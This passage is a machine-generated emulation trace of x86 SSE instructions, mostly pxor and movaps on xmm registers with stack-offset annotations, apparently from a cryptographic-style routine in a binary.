pxor xmm1, xmmword ptr [ebp - 0x20], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 0x432241: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432245: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x43225c: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432260: movaps xmm4, xmmword ptr [ebp - 0x160], regs_read: [20], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x7ea0 for stack size 0x10000 0x432267: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x432274: movaps xmm7, xmmword ptr [ebp - 0xa0], regs_read: [20], regs_write: [129] adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 0x432285: movaps xmm0, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x43229e: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4322a2: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4322a6: movaps xmmword ptr [ebp - 0x50], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 16 0x4322b8: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x4322bf: movaps xmmword ptr [ebp - 0x20], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x4322c7: movaps xmmword ptr [ebp - 0x30], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x4322cb: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x4322d6: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4322da: movaps xmm5, xmmword ptr [ebp - 0x50], regs_read: [20], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x7fb0 for stack size 0x10000 0x4322ed: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4322fa: movaps xmm6, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 0x432302: movaps xmm4, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 0x43230e: movaps xmmword ptr [ebp - 0x60], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x432312: pxor xmm6, xmm7, regs_read: [128, 129], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432316: pxor xmm4, xmm3, regs_read: [126, 125], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43232c: movaps xmm3, xmm6, regs_read: [128], regs_write: [125] 0x43232f: movaps xmmword ptr [ebp - 0x20], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x432333: movaps xmmword ptr [ebp - 0x30], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x43233b: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x43233e: movaps xmmword ptr [ebp - 0x90], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 16 0x432348: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43234c: movaps xmm6, xmm4, regs_read: [126], regs_write: [128] 0x432353: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x43235a: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x43235d: pxor xmm1, xmm5, regs_read: [123, 127], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432366: movaps xmm5, xmm1, regs_read: [123], regs_write: [127] 0x432369: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432371: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x43237d: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432381: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x432396: movaps xmm7, xmmword ptr [ebp - 0xc0], regs_read: [20], regs_write: [129] adjusting stack for ESP 0x0 and offset 0x7f40 for stack size 0x10000 0x4323a3: movaps xmm2, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 0x4323c1: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4323d2: movaps xmmword ptr [ebp - 0x50], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 16 0x4323d6: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4323e4: movaps xmmword ptr [ebp - 0x10], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x4323e8: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x4323ef: movaps xmmword ptr [ebp - 0x20], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x4323f3: movaps xmm1, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x4323f7: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x432402: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432406: movaps xmm5, xmmword ptr [ebp - 0x50], regs_read: [20], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x7fb0 for stack size 0x10000 0x432417: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43242a: movaps xmm6, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x432432: movaps xmm4, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 0x43243e: movaps xmmword ptr [ebp - 0x60], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x432442: pxor xmm6, xmm3, regs_read: [128, 125], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432446: pxor xmm4, xmm7, regs_read: [126, 129], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43245c: movaps xmm3, xmm4, regs_read: [126], regs_write: [125] 0x43245f: movaps xmmword ptr [ebp - 0x20], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x432467: movaps xmmword ptr [ebp - 0x10], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x43246f: movaps xmmword ptr [ebp - 0x90], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 16 0x432476: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x432479: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x43247c: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432480: pxor xmm1, xmm5, regs_read: [123, 127], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432484: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x432490: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432494: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x4324a0: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4324a8: movaps xmm2, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x4324ac: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x4324bb: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x4324db: movaps xmmword ptr [ebp - 0x30], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x4324f2: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432503: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432507: movaps xmmword ptr [ebp - 0x10], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x432510: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x432517: movaps xmmword ptr [ebp - 0x20], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x43251f: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x432522: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x43252d: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432531: movaps xmm5, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 0x432544: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432551: movaps xmm6, xmm7, regs_read: [129], regs_write: [128] 0x432554: movaps xmmword ptr [ebp - 0x50], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 16 0x43255f: movaps xmmword ptr [ebp - 0x30], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x43256f: movaps xmm3, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x432577: movaps xmm4, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 0x43257f: pxor xmm3, xmm6, regs_read: [125, 128], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432583: pxor xmm4, xmm7, regs_read: [126, 129], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432599: movaps xmm5, xmm4, regs_read: [126], regs_write: [127] 0x43259c: movaps xmmword ptr [ebp - 0x20], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x4325a0: movaps xmmword ptr [ebp - 0x10], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x4325ac: movaps xmm1, xmm5, regs_read: [127], regs_write: [123] 0x4325af: pxor xmm1, xmmword ptr [ebp - 0x30], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 0x4325b4: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x4325b7: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4325bb: movaps xmmword ptr [ebp - 0x60], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x4325bf: movaps xmm3, xmmword ptr [ebp - 0xa0], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 0x4325c6: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x4325c9: movaps xmm4, xmm1, regs_read: [123], regs_write: [126] 0x4325e2: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4325e6: movaps xmm0, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 0x4325f1: pxor xmm4, xmm1, regs_read: [126, 123], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4325f5: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x432608: movaps xmmword ptr [ebp - 0x90], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 16 0x43260f: movaps xmmword ptr [ebp - 0xa0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 16 0x43262a: movaps xmm1, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x432635: pxor xmm0, xmm3, regs_read: [122, 125], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432639: pxor xmm1, xmmword ptr [ebp - 0xa0], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 0x43264b: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x432653: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x43265a: movaps xmm5, xmmword ptr [ebp - 0x90], regs_read: [20], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 0x432661: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x432664: movaps xmmword ptr [ebp - 0x30], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x43266c: pxor xmm2, xmm4, regs_read: [124, 126], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432670: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43268d: movaps xmm0, xmmword ptr [ebp - 0x40], regs_read: [20], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 0x43269d: movaps xmmword ptr [ebp - 0x40], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x4326a5: movaps xmm3, xmmword ptr [ebp - 0x40], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 0x4326a9: pxor xmm7, xmm4, regs_read: [129, 126], regs_write: [129] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4326ba: pxor xmm6, xmm3, regs_read: [128, 125], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4326be: movaps xmmword ptr [ebp - 0x20], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x4326d0: movaps xmmword ptr [ebp - 0x60], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x4326d4: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x4326d7: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4326db: movaps xmmword ptr [ebp - 0x40], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x4326e3: movaps xmm2, xmmword ptr [ebp - 0x60], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7fa0 for stack size 0x10000 0x4326eb: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x4326ee: pxor xmm1, xmm5, regs_read: [123, 127], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4326f2: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x4326fe: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432702: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x43270e: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432712: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x43271b: movaps xmmword ptr [ebp - 0x30], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x432729: movaps xmm0, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 0x432753: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432761: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43276f: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x432776: movaps xmmword ptr [ebp - 0x10], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x43277a: movaps xmmword ptr [ebp - 0x60], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x43277e: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x432785: movaps xmm6, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 0x432789: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43279e: pxor xmm6, xmm1, regs_read: [128, 123], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4327bd: movaps xmmword ptr [ebp - 0x40], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x4327c9: movaps xmm3, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x4327d1: pxor xmm3, xmm5, regs_read: [125, 127], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4327d5: movaps xmmword ptr [ebp - 0x30], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x4327e2: movaps xmm7, xmmword ptr [ebp - 0x60], regs_read: [20], regs_write: [129] adjusting stack for ESP 0x0 and offset 0x7fa0 for stack size 0x10000 0x4327e6: pxor xmm7, xmmword ptr [ebp - 0x30], regs_read: [129, 20], regs_write: [129] adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 0x4327f4: movaps xmmword ptr [ebp - 0x20], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x4327f8: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x4327ff: movaps xmmword ptr [ebp - 0x10], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x432803: movaps xmm4, xmm7, regs_read: [129], regs_write: [126] 0x432806: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x432809: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432811: movaps xmm1, xmm4, regs_read: [126], regs_write: [123] 0x432814: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x43281b: pxor xmm1, xmm6, regs_read: [123, 128], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43281f: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x432830: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432834: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x432837: movaps xmm6, xmm2, regs_read: [124], regs_write: [128] 0x432841: pxor xmm3, xmm1, regs_read: [125, 123], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432845: movaps xmm1, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 0x432878: movaps xmmword ptr [ebp - 0x20], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x43287c: movaps xmmword ptr [ebp - 0xa0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 16 0x432883: movaps xmm2, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x432887: pxor xmm0, xmmword ptr [ebp - 0xa0], regs_read: [122, 20], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 0x432895: pxor xmm2, xmm1, regs_read: [124, 123], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4328a3: movaps xmmword ptr [ebp - 0x30], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x4328a7: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x4328ae: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x4328b9: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x4328bc: movaps xmm5, xmmword ptr [ebp - 0xa0], regs_read: [20], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 0x4328c3: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4328dc: pxor xmm6, xmm1, regs_read: [128, 123], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4328f8: movaps xmm3, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 0x432900: movaps xmmword ptr [ebp - 0x60], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x432904: movaps xmmword ptr [ebp - 0xa0], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 16 0x43290b: pxor xmm3, xmm4, regs_read: [125, 126], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43290f: pxor xmm7, xmm5, regs_read: [129, 127], regs_write: [129] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432925: movaps xmmword ptr [ebp - 0x30], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x432929: movaps xmmword ptr [ebp - 0x20], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x43292d: movaps xmm7, xmm3, regs_read: [125], regs_write: [129] 0x432930: movaps xmm6, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [128] adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 0x43293c: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x43293f: pxor xmm0, xmm2, regs_read: [122, 124], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432943: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x432946: pxor xmm1, xmmword ptr [ebp - 0x60], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x7fa0 for stack size 0x10000 0x43294b: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x432952: movaps xmm2, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 0x43295b: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43295f: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x43296b: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x43296f: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x43297e: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x432981: movaps xmm3, xmmword ptr [ebp - 0x80], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7f80 for stack size 0x10000 0x4329a6: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4329bb: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4329bf: movaps xmmword ptr [ebp - 0x180], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7e80 for stack size 0x10000 saving data to stack: 0 16 0x4329cb: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x4329d2: movaps xmmword ptr [ebp - 0x20], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x4329da: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x4329dd: movaps xmmword ptr [ebp - 0x10], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x4329e1: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4329f6: movaps xmm7, xmmword ptr [ebp - 0x180], regs_read: [20], regs_write: [129] adjusting stack for ESP 0x0 and offset 0x7e80 for stack size 0x10000 0x432a01: pxor xmm7, xmm1, regs_read: [129, 123], regs_write: [129] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432a24: movaps xmm4, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 0x432a2c: pxor xmm4, xmm5, regs_read: [126, 127], regs_write: [126] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x432a39: movaps xmmword ptr [ebp - 0x130], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 16 0x432a40: movaps xmm3, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x432a44: movaps xmm6, xmm4, regs_read: [126], regs_write: [128] 0x432a47: pxor xmm3, xmmword ptr [ebp - 0x130], regs_read: [125, 20], regs_write: [125] adjusting stack for ESP 0x0 and offset 0x7ed0 for stack size 0x10000 0x432a5c: movaps xmmword ptr [ebp - 0x20], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x432a60: movaps xmm0, xmm6, regs_read: [128], regs_write: [122] 0x432a63: 